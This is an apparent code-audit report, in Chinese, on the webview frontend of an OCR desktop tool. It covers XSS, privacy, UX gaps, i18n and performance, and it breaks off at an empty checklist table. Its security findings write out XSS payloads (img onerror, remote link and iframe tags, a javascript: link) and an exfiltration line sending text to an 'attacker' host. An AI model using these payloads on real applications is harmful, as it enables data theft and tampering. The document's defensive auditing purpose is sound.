# 02 · 前端与交互探查报告（OCRMiniTool v1.2.0）

探查范围：`webview/index.html`、`webview/js/{app,bridge,i18n}.js`、`webview/css/app.css`、`webview/locales/{zh,en}.json`（只读）。后端仅作为契约/影响面参照，不评其实现。
环境限制：无 GUI、无浏览器 DevTools，**结论全部来自读码 + 静态可执行验证**（Node 语法检查、抽出函数在 Node 里跑真实 payload 与基准）。凡未实际点击验证的，标【推断】。

---

## 0. 结论摘要（先看这 6 条）

1. **XSS 面唯一但真实**：自研 Markdown 渲染把「行首是 HTML 块」的整行**原样**写入 `innerHTML`（`app.js:265, 293-295` → `app.js:355`）。用一张含 `<div><img src=x onerror=…></div>` 文字的图片/PDF 就能在识别结果渲染时执行 JS；实测该 payload 原样通过。
2. 后果不是「弹个框」：页面同源于本机 API，`webview_server.py:265-274` 的 Host/Origin 校验对**同源 XSS 完全无效**（Origin 合法），可读写设置、删历史、外泄 `outputs/*.md`、触发 6.8 GB 下载、关机；结果还会落盘（`webview_backend.py:527,633`），点历史即**存储型**复发。RCE 链被 `apply_python` 的 torch 探测挡住（`webview_backend.py:914-935`），**不能直接 RCE**。
3. **首屏可用性隐患**：`index.html:8-10` 从 `fonts.googleapis.com` 取字体（render-blocking），而前端传输层要等 `window load` 才探测后端（`bridge.js:41-42`）。字体域名被黑洞时，窗口可长时间空白且**初始化/SSE/状态全部挂起**；同时与「数据不出本机」（`index.html:230`）自相矛盾。
4. **「说了没做/半做」6 处**：界面缩放在当前 CSS 下**无任何效果**（`app.js:90-92` + `app.css:85-93,530-531`，全站 0 个 `rem`）；「卸载模型」按钮是假动作（`app.js:633-636`，无对应路由）；6.8 GB 模型下载**不可取消**（`app.js:621-626`，但 `cancel()` 本身通用，`webview_backend.py:729-732`）；批量失败项**不可查看/重试**且错误截断 80 字（`app.js:374,394`）；合并结果**无字数**（`app.js:417-419`，批量有 `app.js:373`）；顶栏 `#view-ctx` 是死元素（`index.html:58`）。
5. **i18n 质量在同类项目里算好**：zh/en 各 236 键、**0 缺键、0 占位符差异**、`app.js` 内**0 处硬编码中文**（仅品牌名 PyTorch/CPU 等）。真正缺陷是「语言切换未重渲染 Python 探测结果」+ 启动期双取语言包（英文用户先见中文）。
6. **性能不必大改**：实测 `mdToHtml` 100 KB 只需 3.8 ms、1 MB 24.8 ms，Markdown 渲染不是瓶颈；本地静态资源合计约 110 KB。**不建议**上虚拟滚动/框架/构建链。

---

## 1. 方法与证据

| 手段 | 用途 | 结果 |
|---|---|---|
| `node --check app.js/bridge.js/i18n.js` | 语法有效性 | 3 个文件均 OK |
| `_work/i18n_check.js`（临时脚本） | locale 键集/占位符/使用点/中文硬编码/CSS 统计 | 236=236 键，0 差异；7 个双端未引用键 |
| `_work/md_probe.js`（临时脚本，从 `app.js` 抽出 `mdToHtml` 原函数执行） | XSS payload 与渲染基准 | 5/9 payload 原样进入 innerHTML；性能见 §6 |
| `grep`（`keydown\|aria-\|role=\|tabindex\|@container`） | 键盘/无障碍/死 CSS | 0 个键盘事件、0 个静态 aria/role、1 个无 `@container` 的 `container-type` |
| 读 `webview_server.py` 路由与响应头 | 契约与 CSP | 22 个前端调用全有路由；**无任何 CSP 头**（`webview_server.py:383-388`） |

---

## 2. 架构

### 2.1 文件与职责（【事实】）

| 文件 | 行/字节 | 职责 | 组织方式 |
|---|---|---|---|
| `index.html` | 245 / 18.8 KB | 三视图（识别/模型/设置）静态骨架 | 单页多 `section.view`，`data-view` 切换（`app.js:68-74`） |
| `app.js` | 934 / 39.6 KB | 全部业务逻辑与渲染 | 顶层顺序脚本：工具→视图→状态→识别→渲染→模型→设置→SSE→init（`app.js:922-934`）；无模块、无类 |
| `bridge.js` | 248 / 11.2 KB | 传输层 `window.OCRApi` | web（HTTP+SSE）/mock 双栈（`bridge.js:21,36`），事件总线 `on/off/emit`（`bridge.js:16-19`） |
| `i18n.js` | 77 / 3.2 KB | 语言包加载 + `data-i18n*` 批量替换 | 单例 IIFE，`setLang` 后 `applyAll` 全文档扫描（`i18n.js:39-45`） |
| `app.css` | 531 / 24.8 KB | 设计系统 + 全站样式 | CSS 变量 token（`app.css:8-31`）+ 深色覆盖（`app.css:51-80`），206 条规则 |

**状态管理**：单一 `state` 字面量（`app.js:15-31`），无订阅/无 reducer；改状态后**手动**调渲染函数。状态与 UI 已出现漂移：`state.settings` 与 `state.status` 各存一份主题/语言（见 F18、F9）。

**渲染模型**：全量 `innerHTML` 重建，共 10 处（`app.js:60, 184-189, 355, 367-382, 502-509, 568-577, 593-596, 662-682, 744-745`）。绝大多数插入都经过 `escapeHtml`（`app.js:46-49`），**只有 `app.js:355` 的 Markdown 预览是原始 HTML 通道**——这正是 §3 的破口。

**事件绑定**：以容器事件委托为主（`app.js:75, 192, 200, 423-441, 511, 685`），页面级监听一次性注册、无 teardown。页面生命周期 = 进程生命周期，故不算泄漏；但 `API.on` 的任何重复注册都不会被清理（目前无重复）。

### 2.2 架构层面的两个真实问题

| 编号 | 证据 | 事实 | 影响 | 建议 | 收益 | 风险 | 验证 |
|---|---|---|---|---|---|---|---|
| A1 | `app.js:113-135` → `app.js:533-577`；`app.js:73` | 每次 `status` SSE 事件都 `renderModelPage()`，其中重写 `#env-panel`、`#model-meta` 的 innerHTML 并重算按钮态 | 状态事件目前低频（任务起止），成本可忽略；但它是「一次状态变化=全页重写」的结构，后续任何高频状态都会放大 | 保持现状即可；若新增高频状态，把 `renderModelPage` 拆成 env/meta/按钮三段，按字段 diff 后再写 | 小（当前） | 低 | 埋点统计 1 次识别期间 `status` 事件数 |
| A2 | `app.js:95-103`、`app.js:820-842`、`app.js:651-707` | `retranslate()` 只重刷 4 块动态区，遗漏 `renderProbeResult` 与（非 model 视图时的）`renderFlavorCard` | 切换语言后 Python 探测结果仍是旧语言；model 视图因 `switchView` 里 `loadEnv()` 恰好被救回 | `retranslate` 增补 `renderProbeResult(pyUI.lastProbe)`，并把 `state.env` 缓存交给 `renderFlavorCard` | 小（一致性） | 低 | 在设置页跑一次「检测」→切英文→观察探测行语言 |

---

## 3. 安全：XSS、CSP、数据出站

### 3.1 注入路径（必须按行给判断）

| ID | 严重度 | 注入路径（输入 → 代码 → 后果） | 修复 | 验证 |
|---|---|---|---|---|
| **S1** | **高** | **输入**：一张图片/PDF，正文含文本 `<div><img src=x onerror="F()"></div>`（OCR 会忠实转写，代码注释也承认模型输出原生 HTML 表格，`app.js:264`）。**代码**：`mdToHtml` 判定行首为 HTML 块（`app.js:265` 白名单含 `div/table/td/p/…`；`app.js:266` 黑名单只挡行首 `script/iframe/object/embed/link/meta`）→ 整行原样 `out.push(line)`（`app.js:293-295`）→ `#md-render.innerHTML`（`app.js:355`）。**后果**：`img onerror` 在 innerHTML 插入后立即执行，无需点击。同源下 `Origin` 合法，`webview_server.py:265-274` 的 Host/Origin 校验**不构成防护**；页面可 POST `/api/settings`（改 modelDir/mirror/lang 持久化）、`/api/history-read`（读 `outputs/*.md`，`webview_backend.py:749` 只防穿越不防读）、`/api/history-delete`（移入回收站）、`/api/download`（拉 6.8 GB）、`/api/shutdown`；再用 `new Image().src='http://attacker/?d='+encodeURIComponent(text)` 外泄。RCE 链：`/api/apply-python` 需目标环境 torch+transformers 探测通过（`webview_backend.py:914-935`），**不可直接达成**。结果已落盘 `outputs/*.md`（`webview_backend.py:527,633`），点历史即**存储型**复发。 | ①把 HTML 直通改为「解析 + 白名单重建」：`DOMParser` 解析整行/整段，仅保留 `table,thead,tbody,tfoot,tr,th,td,ul,ol,li,p,div,br,figure,figcaption,h1-h4`，属性仅 `colspan/rowspan`（其余全删），再序列化；②服务端为 HTML 响应加 CSP（`script-src 'self'`，禁内联 handler）作纵深防御（`webview_server.py:383-388` 目前无 CSP）；③删除 `app.js:266` 的伪黑名单（`<script>` 经 innerHTML 本就不执行，见 S4）。 | 用 `_work/md_probe.js` 的 payload 集回归；替换后 `RAW_SINK_ACCEPTED` 必须全 false |
| **S2** | 中低 | `<div><link rel=stylesheet href="http://evil/x.css">` 同行首白名单 → 原样插入；`link` 虽在黑名单但**只匹配行首**（`app.js:266` 有 `^\s*` 锚点）。后果：远端 CSS 注入可篡改界面（钓鱼「设置已保存」/隐藏提示）、泄漏 IP 与使用时间。 | 同 S1（白名单丢弃 `link`）；CSP `style-src 'self'` 也可挡 | 同上 |
| **S3** | 中低 | `<div><iframe src=http://evil></iframe></div>` 同理绕过（行首是 `div`）。同源父页面不能被读，但可嵌入伪界面/外部信标。 | 同 S1，白名单不含 iframe；CSP `frame-src 'none'` | 同上 |
| S4 | 低（结论） | 黑名单 `HTML_DANGEROUS_RE`（`app.js:266`）既**不必要**（`<script>` 经 innerHTML 不执行，仅需防属性/`img`/`svg`）又**不充分**（只查行首，且不含 `img/svg/style/on*`）。安全错觉本身就是风险。 | 删黑名单，统一走白名单 | 阅读代码即可 |
| S5 | 低 | 链接渲染 `app.js:279-280`：`![alt](src)` → `<img src="$2">`、`[t](url)` → `<a href="$2" target="_blank">`，URL 未做协议白名单。实测 `javascript:` 因 `[^)]+` 在第一个 `)` 截断而多半失效（`javascript:alert(document.domain` 非法），但 `[x](javascript:alert\`1\`)` 可构造；`target=_blank` 的 WebView2 新窗口策略未验证【推断】。另 `<img src=远端>` 会让页面出站（隐私/信标）。 | href/src 白名单 `https?:/mailto:` + 相对路径；否则降级为纯文本 | 实测 payload 见 `_work/md_probe.js` |
| S6 | 低 | `i18n.js:41` 对 `[data-i18n-html]` 做 innerHTML；当前仅 `drop.big`（`index.html:67`）一处、语言包为本地文件。若将来语言包可被替换（或新增语言的 JSON 由第三方提供），即成 XSS 面。 | 保留但加注释约束；新增语言包纳入 code review 清单 | review 规则 |

**已核对为安全（不必再查）**：文件名回显（`app.js:185-188` 全 `escapeHtml`）、批量条目名/错误（`app.js:377,374`）、历史名（`app.js:503-506`）、模型错误横幅（`app.js:611`）、环境面板（`app.js:570-577`）、探测结果（`app.js:838`）、日志（`app.js:60`）。唯一未转义插值是 `renderFlavorCard` 的 `o.key`（`app.js:670-671`），来源是后端静态 `torch_flavors()` 白名单，**非用户输入**，记为「将来若动态化需改」。

### 3.2 隐私与「数据不出本机」的一致性

| 编号 | 证据 | 事实 | 影响 | 建议 | 收益 | 风险 | 验证 |
|---|---|---|---|---|---|---|---|
| P1 | `index.html:8-10` + `index.html:230` + `README.md:34-36` | 每次启动都会向 `fonts.googleapis.com`/`fonts.gstatic.com` 请求 3 个字族（含 CJK `Noto Sans SC`）；同页却宣称「Local inference · your data never leaves this computer」 | ①事实与文案矛盾；②离线/被墙时 render-blocking，窗口长时间空白（见 P2） | 自托管 woff2 到 `webview/fonts/`（`--font-ui` 已含 `Microsoft YaHei`，中文可不引 Noto；Space Grotesk/Mono 各 1-2 个 woff2，约 60-100 KB）或直接删掉自定义字体 | 大（可用性+隐私） | 低 | 断网启动计时；抓包确认无外域请求 |
| P2 | `bridge.js:34-43`（`window load` 后才 `settle`）+ `app.js:923`（init `await API.ready`） | 传输层模式探测挂在 `window load`；`load` 需等所有样式表。字体 CSS 不可达时，`API.ready`、`getSettings`、`getStatus`、SSE 全部延后 | 窗口可能空白/无数据数十秒；用户会认为程序坏了 | `DOMContentLoaded` 即 `settle()`（脚本在 body 末尾，DOM 已就绪），或直接去掉 probe、以 `fetch('/api/settings')` 成败定模式；字体改 `media="print" onload="this.media='all'"` 或自托管 | 大 | 低 | 断网/屏蔽域名后启动，看首屏可用时间 |
| P3 | `bridge.js:21,36` + `bridge.js:189,202-233` + `app.js:933` | `/health` 1.5 s 探测失败即静默进 `mock`：状态显示「模型就绪」、点识别返回**假结果**、版本号 `1.1.1`（真实 `version.py:3` 为 1.2.0）；仅在日志里写一行「展示模式」 | 用户可能把演示文本当真实识别结果（数据可信度风险） | mock 模式在顶栏常驻醒目横幅；识别按钮禁用并提示；`MOCK.status.version` 改读真实版本或删字段 | 中 | 低 | 临时关掉 server 打开页面观察 |
| P4 | `app.js:280` | 结果里的外部链接 `target="_blank"`，无确认 | 把用户带出应用到外部浏览器（体验+安全） | 改为点击前 `confirm`，或 `href` 只允许 http(s) 并在外部浏览器打开时给提示 | 小 | 低 | 造一个含外链的 md 结果点击 |

---

## 4. 交互缺口（对照 README 功能描述）

| 编号 | 现象与证据 | 与宣称/预期的差 | 影响 | 建议 | 收益 | 风险 | 验证 |
|---|---|---|---|---|---|---|---|
| **F1** | **界面缩放完全无效**：`app.js:90-92` 只改 `documentElement.style.fontSize`；但 `app.css:85-93` 把 `body` 写死 `font-size:14px`，全站 **235 个 px、0 个 rem**（仅 md 边距用 em）。CSS 声明 `html{font-size:16px}`（`app.css:531`）在下层被覆盖 | README:34/87、设置项说明「调整文字与控件大小」未实现 | 80–150% 档位点击后**无任何视觉变化**，属功能缺失 | 方案 A（小）：改 `documentElement.style.zoom = pct/100`（WebView2/Chromium 支持，一处改动）；方案 B（大）：CSS 全面 rem 化。**推荐 A** | 大（宣称功能） | 低 | 选 150% 后 `getComputedStyle(document.body).fontSize` 仍为 14px；改用 zoom 后 `document.documentElement.style.zoom === "1.5"` |
| **F2** | 模型下载不可取消：`app.js:621-626` 只启动进度，无取消按钮；而后端 `cancel()` 明确「下载/识别页间生效」（`webview_backend.py:729-732`），路由 `/api/cancel` 已存在 | 6.8 GB 下载一旦开始，UI 无出口（只能关窗/杀进程） | 高（大文件+误触） | 在 `#model-progress` 旁加「取消」按钮 → `API.cancel()`，并在 SSE 收到 `dl-progress pct=0 + cancelled` 时复位 | 大 | 低 | 起下载→3 s 后点取消→观察进度停止、按钮恢复 |
| **F3** | 「卸载模型」是假按钮：`app.js:633-636` 只 `flash(t("msg.unloadHint"))`（文案自认「当前版本不释放」），无 `/api/unload` 路由 | 按钮存在即承诺；点击后模型仍占内存 | 中（困惑） | 隐藏按钮（`hidden`）或改为「重启以卸载」并直接触发重启；不要保留无动作按钮 | 中 | 低 | 点击观察是否有状态变化 |
| **F4** | 批量失败项不可查看、不可重试：`viewBatchItem` 对 `!it.ok` 直接 return（`app.js:391-394`），失败错误被截 80 字（`app.js:374`）；而每项都渲染「查看 ›」（`app.js:380`，`result.view` 文案） | README:53「逐文件显示进度与成败」只兑现了「成败」；失败原因不可诊断 | 中高（用户无法自救） | 失败项点击展开完整错误（后端已回全量 `error`）；提供「重试失败项」按钮（把失败文件留在 `state.files` 重新 run）；失败项隐藏「查看 ›」 | 中 | 低 | 用损坏 PDF 触发失败，点该项 |
| F5 | 批量全失败时右侧残留上一次结果：`showBatchResult` 末尾 `viewBatchItem(state.viewIndex)`（`app.js:388`），`viewIndex` 由 `findIndex(ok)` 得 -1（`app.js:230`），早退后 `#md-render` 保留旧内容 | 结果区与批量列表不一致（显示的是上一次识别） | 中（误导） | 无 ok 项时清空 `#md-render`/`#page-tabs` 并显示空态文案 | 小 | 低 | 先成功识别一次，再用两个坏文件跑批量 |
| **F6** | 拖放只在 `#drop` 上 `preventDefault`（`app.js:159-165`，元素 `index.html:65`）；页面其它区域没有 `dragover/drop` 兜底 | 把文件丢到结果区/侧栏时，WebView2 走默认导航/打开文件【推断：Chromium 语义】 | 中（丢状态、可能白屏） | 在 `document` 上统一 `dragover/drop` 阻止默认；落在 `#drop` 外时提示「请拖到上方虚线框」 | 中 | 低 | 把 png 拖到右侧结果区，观察是否跳转 |
| F7 | 文件管理薄弱：`addFiles` 直接 `push`，无去重、无排序、无清空、无总数（`app.js:167-179`）；仅支持单个 `×` 删除（`app.js:192-197`） | 合并模式**页序 = 选择顺序**，选错顺序只能全删重选；同一文件拖两次会重复识别/重复页 | 中 | 加：同名去重提示、`#file-list` 内上移/下移（或拖拽排序）、`清空` 按钮、`共 N 个文件 · 合计 X MB` 摘要 | 中 | 低 | 拖同一文件两次观察列表 |
| **F8** | 结果**不可编辑**：Markdown 原文 `#md-raw` 是 `readonly`（`index.html:123`），预览态无编辑入口 | OCR 必然有错字，用户只能「复制到别处改」；「保存」不能保存修订 | 高（核心工作流） | 去掉 `readonly`，`input` 事件回写 `state.lastResult.text/pages[curPage]` 并置「已编辑」标记；保存/复制取编辑后的文本 | 大 | 低 | 输入文字→切预览→内容应同步 |
| F9 | 结果元信息缺失/不一致：合并结果只显示「页数 · 耗时」（`app.js:417-419`），**无字数**；批量项有字数（`app.js:373`） | README:56 宣称进度显示「已生成字数 + 已用时」（运行时 `prog.ticker` 确实有），但结果区没有；用户无法快速判断产出规模 | 小中 | `result.pageMeta` 增加 `{chars}`（合并取 `text.length`，单页取该页长度） | 小 | 低 | 识别后看 `#result-meta` 文案 |
| F10 | 错误提示可读性差：所有错误只进 `#ocr-log`（`app.js:50-62`），该容器在页面**最底部**（`index.html:133`，`app.css:414-419` `max-height:130px`），不滚动到可视；失败后进度条 1.5 s 自动隐藏（`app.js:251`） | 错误被「藏」起来，用户只觉得「点了没反应」 | 中高 | 错误用顶部 `banner-warn`（样式已存在，`app.js:609-611` 复用）+ `scrollIntoView`；或统一 toast 区域 | 中 | 低 | 停掉 server 后点识别 |
| F11 | **键盘可达性近乎为零**：全仓 `grep keydown/keyup/Escape/ctrlKey` = 0 命中；无 Esc 取消、无 Enter/Ctrl+Enter 开始、无 Delete 删文件；`#model-status` 是可点 `div`（`index.html:48` + `app.js:79`，无 tabindex/role）；历史删除 `span[role=button][tabindex=0]`（`app.js:506`）**没有 keydown 处理**，Enter/Space 无效 | 纯键盘用户只能用 Tab 走到 `#btn-pick` 开文件，之后流程中断 | 中（无障碍） | 加最小集：`Ctrl+Enter` 开始、`Esc` 取消、`#model-status` 改 `<button>`、`.hx` 补 `keydown`（Enter/Space）→ 删除，并把 `span` 移出 `<button>`（当前嵌套交互元素，HTML 非法） | 中 | 低 | 只用键盘走一遍识别流程 |
| F12 | 无障碍语义缺失：`index.html` 全文 **0 个** `aria-*`/`role`/`tabindex`；进度条是无语义 `div`（`index.html:103-106`、`155-158`、`183-186`），日志/结果无 `aria-live`（`i18n.js:44` 的 `data-i18n-aria` 通道**从未被使用**） | 读屏软件读不到进度与结果 | 中 | 进度容器加 `role=progressbar aria-valuenow`；`#ocr-log`、`#result-meta` 加 `aria-live=polite`；`#drop` 加 `role=button tabindex=0`+Enter 触发（同时解决 F11 一半） | 中 | 低 | 读屏/axe 静态检查 |
| F13 | 历史项不显示时间，虽然后端已回 `mtime`（`webview_backend.py:735-746`），前端只渲染 `name+size`（`app.js:502-509`）；点历史文件时 `lastResult` 造 `pages:[text]`、`elapsed:0`（`app.js:525`），结果区显示「1 页 · 0 秒」（`app.js:417-419`）**伪造元信息** | 用户分不清新旧、看不出历史结果规模 | 中 | 历史项显示相对时间（`toLocaleString(I18N.localeTag())`）；来源为历史时元信息显示「文件 · 大小 · 修改时间」，不显示页/耗时 | 小 | 低 | 打开任一条历史 |
| F14 | 「复制全文」语义漂移：选中某一页标签时实际复制**当前页**（`app.js:447-448`），但按钮文案恒为 `btn.copy`=「复制全文/All」 | 复制内容与文案不符，多页文档易误用 | 小 | 文案随 `state.curPage` 变（「复制本页/复制全文」），或始终复制全文并在 `flash` 说明 | 小 | 低 | 多页结果切到第 2 页点复制，粘贴比对 |
| F15 | 运行中仍可改输入：`#prompt-box` 可编辑但在点击时已读取（`app.js:221`，改了不起作用）；`#file-list` 的 `×` 与拖放无 `state.running` 守卫（`app.js:159-179,192-197`） | 用户以为新文件/新提示词会生效，实际只影响下一次 | 小中 | 运行中禁用 prompt 与删除/拖放（`fieldset disabled` 或加 class 指针拦截）+ 文案「已提交，改动将在下次识别生效」 | 小 | 低 | 运行中删一个文件观察 |
| F16 | 保存/下载在 WebView2 中落点不可知：`app.js:476-493` 用 `a[download]`+blob，`app_webview.py:276` 仅 `ALLOW_DOWNLOADS=True`，无下载 UI/路径提示 | 用户不知道文件存哪了（也可能被静默拦截）【推断，需真机】 | 中 | 保存后 `flash` 出「已保存到 下载/…」；或改走后端「导出到 outputs/ 并打开目录」（需新增路由，跨域改动） | 中 | 中（依赖后端） | 打包版点保存→查 `%USERPROFILE%\Downloads` |
| F17 | 死元素/死样式：`#view-ctx`（`index.html:58`，样式在 `app.css:182`）从未被 JS 写入；`container-type:inline-size`（`app.css:184`）无对应 `@container`；`MOCK` 里的 `startLoad` 假进度（`bridge.js:118-122`）仅 mock 用 | 维护噪声；顶栏右侧永远空白 | 小 | 删除或真正用于显示「设备 · 输出目录」上下文（对用户有价值的信息现只在设置页） | 小 | 低 | `grep view-ctx` 仅 1 命中 |
| F18 | 「跟随系统」主题在系统切换时不生效：`app.js:87-89` 的 `matchMedia` 监听读 `state.status?.theme`，但 `get_status()` 返回体**没有 `theme` 字段**（`webview_backend.py:218-245`）；真实值存在 `state.settings.theme`（`app.js:749`） | 设置「跟随系统」后，系统深浅色切换时界面不跟着变（需重启或重进设置页） | 小中 | 改读 `state.settings.theme`（`status` 保留兜底） | 小 | 低 | 设置「跟随系统」→切 Windows 深浅色→看 `<html data-theme>` |

---

## 5. i18n 完整性

| 检查项 | 结果（【事实】） |
|---|---|
| 键数量/顺序 | zh 236 = en 236，**键序完全一致**（`locales/zh.json`、`en.json`） |
| 单边缺键 | **0**（双向差集为空） |
| 占位符差异 | **0**（如 `{n}/{chars}/{time}/{stage}` 全部对齐） |
| 空值 | 0 |
| 前端用到的键是否有定义 | 0 缺失（`index.html` 的 `data-i18n*` + `app.js/bridge.js` 的 `t()/tr()` 全集比对） |
| 双端都未引用的键 | 7 个：`env.flavor.cpu`、`env.flavor.cpuDesc`、`env.flavor.cu128`、`env.flavor.cu128Desc`、`env.flavorSetNeedDl`、`err.noTorch`、`meta.nativeName`（后 6 个其实由 Python 侧用 `label_key` 字符串/`tr(变量)` 间接使用，`downloader.py:273-284`、`i18n.py:113-118`、`webview_backend.py:405` → 建议加注释，避免被误当死键清理） |
| JS/HTML/CSS 硬编码中文 | **0 处代码文案**（`app.js` 仅注释中文；`bridge.js:93-241` 的中文全是 `tr(key, params, 中文兜底)` 的兜底串，键都存在 → 兜底是死代码但会造成「两份文案」漂移风险）；`index.html` 静态英文属默认兜底；`i18n.js:21` 的「中文」是语言自称，正确 |
| 新增语言是否零代码 | 基本成立：后端扫 `webview/locales/*.json`（`i18n.py:95,113-118`），前端下拉动态填充（`app.js:739-746`）。但要注意：①缺键静默降级为显示 key 本身（`i18n.js:30`）；②无复数机制（en 的 `file(s)` 已用括号糊过）；③`fmtSize` 单位（B/KB/MB/GB）、`toLocaleTimeString` 之外无本地化数字/日期；④`data-i18n-html` 全站仅 1 处，可保留 |

**i18n 具体缺陷**：

| 编号 | 证据 | 事实 | 影响 | 建议 | 收益 | 风险 | 验证 |
|---|---|---|---|---|---|---|---|
| I1 | `i18n.js:72`（启动强制 `setLang("zh")`）+ `app.js:923-927`（`API.ready` 后才读到真实 `lang` 再 `setLang`） | 英文用户启动经历：中文静态文案 → `window load` → 探测 → 取设置 → **第二次**取语言包。两次 `fetch locales/*.json`（各约 13.4 KB） | 中英切换闪烁 1–2 s；多一次网络/DOM 全扫描 | 启动前用 `localStorage.getItem("lang")` 预置；后端设置到手后若相同则不重复 `setLang`/`applyAll` | 小中 | 低 | 英文设置下冷启动录屏 |
| I2 | `app.js:95-103` vs `app.js:820-842` | 语言切换不重渲染 `#py-probe-out`（见 A2） | 中英混排残留 | 缓存最近一次 probe 结果（`pyUI.lastProbe`）并在 `retranslate` 重渲染 | 小 | 低 | 见 A2 |
| I3 | `i18n.js:30` | 键缺失时 `t()` 返回键名本身（如界面出现 `nav.ocr`），无英文兜底链 | 新语言/漏译直接暴露原始 key | 加 FALLBACK 链（`lang` → `en` → key） | 小 | 低 | 临时删一个 en 键 |
| I4 | `bridge.js:93-98,120,168-241` | mock/兜底中文串与 locale 重复维护 | 文案一旦改 locale，兜底仍是旧文案（仅 file:// 预览可见） | 删掉 `fb` 参数，`tr()` 缺键时用 `t(key)` 原样返回；mock 文案迁移到 `locales/*.json` 的 `mock.*`（已存在同名键） | 小 | 低 | `grep '"选择文件夹"'` |

---

## 6. 性能、体量与稳定性

### 6.1 体量（【事实】）

| 资源 | 字节 | 备注 |
|---|---|---|
| `index.html` | 18,769 | 内联 SVG 图标约 8 KB（合理） |
| `app.js` / `bridge.js` / `i18n.js` | 39,640 / 11,233 / 3,215 | 未压缩、无构建；总量约 54 KB |
| `app.css` | 24,809 | 206 规则、17 处 `box-shadow`、3 处 `!important`、0 `backdrop-filter` |
| `locales/zh,en.json` | 13,423 / 13,874 | 启动至少取 1 次（当前实现最多 2 次，见 I1） |
| **合计** | **≈ 110 KB** | 本机 HTTP，无压缩/无 ETag：`Cache-Control: no-cache`（`webview_server.py:386`），每次启动全量重传（可接受，量小） |

### 6.2 渲染与 SSE

| 编号 | 证据 | 事实/实测 | 影响 | 建议 | 收益 | 风险 | 验证 |
|---|---|---|---|---|---|---|---|
| R1 | `mdToHtml`（`app.js:268-329`） | **实测**（Node，抽原函数）：100 KB/700 行 = **3.8 ms** → 124 KB HTML；500 KB = 12.6 ms；1 MB = 24.8 ms → 1.27 MB HTML；`mdToPlain` 100 KB = 1.1 ms | JS 侧不是瓶颈；真正成本在 WebView2 `innerHTML` 解析+布局（未测，【推断】数十 ms 级） | **不建议**做虚拟滚动/分片渲染；若将来确有 1 MB 级结果，先加「渲染耗时」埋点再定 | —（避免过度工程） | 低 | `_work/md_probe.js` |
| R2 | `webview_backend.py:408-425`（env 下载 `cb` 无节流）+ `downloader.py:203-209`（每 64 KB 回调一次） | 模型下载有 250 ms 节流（`webview_backend.py:273-278`），**引擎组件下载没有**：10 MB/s 时约 160 事件/秒走 SSE；前端每个事件做 2 次 DOM 写（`app.js:721-725,726-733`），`pct>=1` 边界还会触发 `loadEnv()`+`getStatus()` | 中（CPU 抖动/主线程忙） | 前端合并：用 `requestAnimationFrame`/最后写入时间戳（≥100 ms）节流 `setFlavorProgress`；根本修复在后端加 250 ms 节流（跨域，小改动） | 中 | 低 | 起组件下载，DevTools Performance 看事件频率 |
| R3 | `app.js:73` + `webview_backend.py:367-400`（`env_status` 每次跑 `recommend_torch_flavor()` 硬件检测） | 每次切到模型页、每次语言切换都实时探测硬件；前端无缓存 | 低中（模型页切换有延迟） | 前端 `state.env` + 10 s TTL 缓存；切换视图时仅在过期或 `envDownloading` 变化时重取 | 小中 | 低 | 连续点两次「模型」导航，计网络请求数 |
| R4 | `app.js:726-733` | `pct>=1` 时 `setTimeout(loadEnv,800)`，若同一批次有多个 `pct=1` 事件会叠加多次探测 | 小 | 加去重标志 | 小 | 低 | 观察下载完成后 `/api/env` 请求数 |
| R5 | `app.js:53-62` | 日志每条都重建 200 行 innerHTML；上限 200 行（防爆内存） | 小（日志低频） | 保持；若要改，改为 `insertAdjacentHTML`+裁剪首行 | 小 | 低 | 代码审阅 |
| R6 | 内存 | EventSource 未 `close()`（进程级，可接受）；`logLines` 有上限；`state.files` 持 File 引用直到删除（大 PDF 会常驻内存）；blob URL 5 s 回收（`app.js:492`）；无定时器泄漏 | 低 | 识别完成后释放已上传 File 引用（保留 `name/size` 元数据用于重试对话框） | 小 | 低 | 连续跑 10 次大文件看内存曲线 |
| R7 | `index.html:11,241-243` 的 `?v=1/2/3` | 服务端 `no-cache` 且无 ETag/Last-Modified（`webview_server.py:383-388`），`?v=` 实为无效装饰 | 极小 | 要么删 `?v=`，要么服务端加 ETag 让缓存真正生效 | 小 | 低 | 二次加载 Network 面板 |

---

## 7. 与后端契约的耦合点

前端 22 个调用点 → 服务端路由（`webview_server.py:277-351`）**全部存在**，无 404 风险：`/health`、`/api/{status,settings(GET/POST),env,env/set,env/download,env/cancel,download,load,recognize,cancel,history,history-read,history-delete,browse-folder,browse-file,probe-python,apply-python,open-output,shutdown,events}`。

| 编号 | 证据 | 事实 | 影响 | 建议 | 收益 | 风险 | 验证 |
|---|---|---|---|---|---|---|---|
| C1 | `bridge.js:161-164` | `API.shutdown()` 及 `/api/shutdown` **无任何调用方**（`grep shutdown webview/js`、`app_webview.py` 均无） | 死代码 + 一条可被 XSS 利用的关机路径 | 删前端方法；`/api/shutdown` 是否保留由后端定（原生窗口已有 `events.closing` 确认，`app_webview.py:285-298`） | 小 | 低 | grep |
| C2 | `bridge.js:94,111,137,141,145,153` 的 `catch {}` | 失败时返回 `undefined`；调用点按对象用：`app.js:779`（`r.ok`）、`app.js:844`、`app.js:498`（`const {items} = await API.listHistory()` 直接解构）。网络抖动 → **TypeError 未捕获 Promise 拒绝**，历史/浏览按钮静默失效 | 中（错误处理裂缝） | 统一返回 `{ok:false,error}` 或让异常上抛；调用点加 `?.`/try。`refreshHistory` 改为 `const r = await API.listHistory(); const items = r?.items || []` | 中 | 低 | 断网后点「浏览」「打开输出目录」 |
| C3 | `bridge.js:56-60` vs `61-72` | `apiGet` 只回 `"HTTP 500"`，`apiPost` 会解析 `error.message`（`:68`） | GET 类失败（状态/设置/env/历史）用户只看到裸 HTTP 码 | `apiGet` 复用 `apiPost` 的错误解析 | 小 | 低 | 人为 500（改路由）观察日志 |
| C4 | `webview_server.py:467` | 识别 500 只回异常**首行前 300 字符** | 前端能展示的诊断信息有限（配合 F10/F4 更明显） | 前端「复制错误详情」按钮；后端在 `log_error` 里已写全量，加「打开日志」入口 | 小 | 低 | 制造失败后查看 log |
| C5 | `bridge.js:186-199` | `MOCK` 数据与真实契约漂移（版本 1.1.1、`status` 缺 `busyLabel/torchPin` 等字段） | mock 模式演示/开发误导（P3） | 仅保留最小 mock + 顶部横幅（P3），版本从 DOM 注入或删除 | 小 | 低 | 对比 `MOCK.status` 与 `get_status()` 字段 |

---

## 8. 低风险可落地清单（建议按此顺序合并）

| 编号 | 改动点 | 收益 | 风险 | 验证 |
|---|---|---|---|---|
